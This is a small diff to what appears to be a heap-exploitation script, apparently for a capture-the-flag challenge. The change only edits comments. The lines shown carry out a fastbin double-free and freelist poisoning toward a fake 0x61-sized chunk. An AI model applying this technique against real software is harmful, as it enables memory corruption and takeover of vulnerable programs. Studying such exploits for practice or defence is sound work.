@@ -61,9 +61,9 @@ chunk_add(0x38, p64(0x0) * 5 + p64(0x61))
 chunk_free(0) # 0
 chunk_free(1) # 0 -> 1
 chunk_free(0) # 0 -> 1 -> 0
-chunk_add(0x38, p64(0x61)) # 1 -> 0 -> target
-chunk_add(0x38, 'aaaa') # 0 -> target
-chunk_add(0x38, 'bbbb') # target
+chunk_add(0x38, p64(0x61)) # 1 -> 0 -> 0x61
+chunk_add(0x38, 'aaaa') # 0 -> 0x61
+chunk_add(0x38, 'bbbb') # 0x61
 
 chunk_add(0x58, '0000')
 chunk_add(0x58, '1111')
